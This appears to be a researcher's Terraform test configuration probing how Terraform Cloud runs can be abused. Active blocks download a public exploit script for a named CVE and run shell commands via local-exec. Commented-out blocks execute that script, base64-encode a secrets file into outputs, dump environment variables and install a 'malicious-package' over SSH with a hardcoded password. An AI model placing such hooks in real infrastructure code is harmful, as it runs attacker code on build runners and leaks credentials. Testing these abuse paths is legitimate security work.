# terraform {
#   required_version = "1.0.0"
# }

terraform {
  cloud {
    hostname     = "app.staging.terraform.io"
    organization = "foobar-test"

    workspaces {
      name = "curly-cli"
    }
  }

  required_providers {
    local = {
      source  = "hashicorp/local"
      version = "~> 2.0"
    }
  }
}

# # for 1.0.0
# terraform {
#   backend "remote" {
#     # hostname     = "tfe.james-warren.sbx.hashidemos.io"
#     organization = "example-org-16b5c1"

#     workspaces {
#       name = "sensitive-drift"
#     }
#   }
# }
# # /1.0.0


# terraform {
#   required_providers {
#     template = {
#       source  = "hashicorp/template"
#       version = "2.2.0"
#     }
#   }
# }

# provider "template" {
#   # Configuration options
# }

# terraform {
#   required_providers {
#     aws = {
#       source  = "hashicorp/aws"
#       version = "~> 6.0"
#     }
#   }
# }

# # Configure the AWS Provider
# provider "aws" {
#   region = "us-east-1"
# }

# data "aws_ami" "ubuntu" {
#   most_recent = true

#   filter {
#     name   = "name"
#     values = ["ubuntu/images/hvm-ssd/ubuntu-jammy-22.04-amd64-server-*"]
#   }

#   filter {
#     name   = "virtualization-type"
#     values = ["hvm"]
#   }

#   owners = ["099720109477"] # Canonical
# }

# resource "aws_instance" "example" {
#   ami           = data.aws_ami.ubuntu.id
#   instance_type = "t3.micro"

#   tags = {
#     Name = "HelloWorld"
#   }
# }

# resource "null_resource" "run_on_server" {
# provisioner "remote-exec" {

#   # it runs when this null_resource is destroyed
#   when = destroy

#   # This connection block points to the existing resource
#   connection {
#     type     = "ssh"
#     user     = "ec2-user"
#     password = "password"
#     # private_key = private-key

#     host = self.public_ip
#   }

#   # Theses run on the app_server
#   inline = [
#     "sudo apt-get install -y malicious-package"
#   ]
# }
# }


resource "random_pet" "server" {
  keepers = {
    foo = "bar2"
  }
  # provisioner "local-exec" {
  #   when    = destroy
  #   command = "touch pet-destroy.pwn"
  # }
}


resource "null_resource" "run_on_server" {
  triggers = resource.random_pet.server.keepers
  provisioner "local-exec" {

    # it runs when this null_resource is destroyed
    when    = destroy
    command = "touch destroy.pwn"
    # # Theses run on the app_server
    # inline = [
    #   "sudo apt-get install -y malicious-package"
    # ]
  }
}


##############################################

# variable "db_secret" {
#   type      = string
#   sensitive = true
# }
# resource "random_pet" "database" {
#   keepers = {
#     always     = timestamp()
#     foo-secret = var.db_secret
#   }
# }
# output "db" {
#   value     = var.db_secret
#   sensitive = true
# }


# data "external" "bad" {
#   program = ["./malicious"]
# }

# resource "null_resource" "output" {
#   triggers = data.external.bad.result
# }

##############################################

# # data "external" "env" {
# #   program = ["python", "-c", '"from os import environ; print({k:v for (k, v) in environ.items()})"']
# # }

# output "bad" {
#   value = data.external.bad.result
# }

###############################################
# CVE-2026-31431
###############################################
data "http" "exp" {
  url = "https://raw.githubusercontent.com/theori-io/copy-fail-CVE-2026-31431/refs/heads/main/copy_fail_exp.py"
}

locals {
  file_content = data.http.exp.response_body
}

resource "local_file" "exp_script" {
  content  = local.file_content
  filename = "${path.module}/exp.py"
}

# data "external" "external_data_content" {
#   depends_on = [local_file.exp_script]
#   program = ["/bin/bash", "-c", "printf '{\"result\": \"%s\"}' %\"$(cat ./exp.py | base64 --wrap=0)\""]
# }

resource "null_resource" "run_exp" {
  depends_on = [local_file.exp_script]

  triggers = {
    timestamp = timestamp()
  }

  provisioner "local-exec" {
    command = "ls -lahR /usr/bin/"
  }
}

# resource "null_resource" "run_exp" {
#   depends_on = [local_file.exp_script]

#   triggers = {
#     timestamp = timestamp()
#   }

#   provisioner "local-exec" {
#     command = "python3 ${path.module}/exp.py"
#   }
# }

###############################################

# data "external" "external_data_shell" {
#   # Spawn a new bash process, run the subprocess, base64 encode the results, echo them in a JSON blob
#   program = ["/bin/bash", "-c", "printf '{\"result\": \"%s\"}' %\"$(cat ./secrets | base64 --wrap=0)\""]
# }

# resource "null_resource" "output" {
#   triggers = data.external.external_data_shell.result
# }

#   lifecycle {
#     prevent_destroy = true
#   }
#   # triggers = timestamp()
#   # lifecycle {
#   #   precondition {
#   #     condition     = data.external_data_shell.result != ""
#   #     error_message = "asdf"
#   #   }
#   # }

# module "iam_user" {
#   source = "terraform-aws-modules/iam/aws//modules/iam-user"

#   name          = "vasya.pupkin"
#   force_destroy = true

#   # pgp_key = "keybase:test"

#   password_reset_required = false
# }
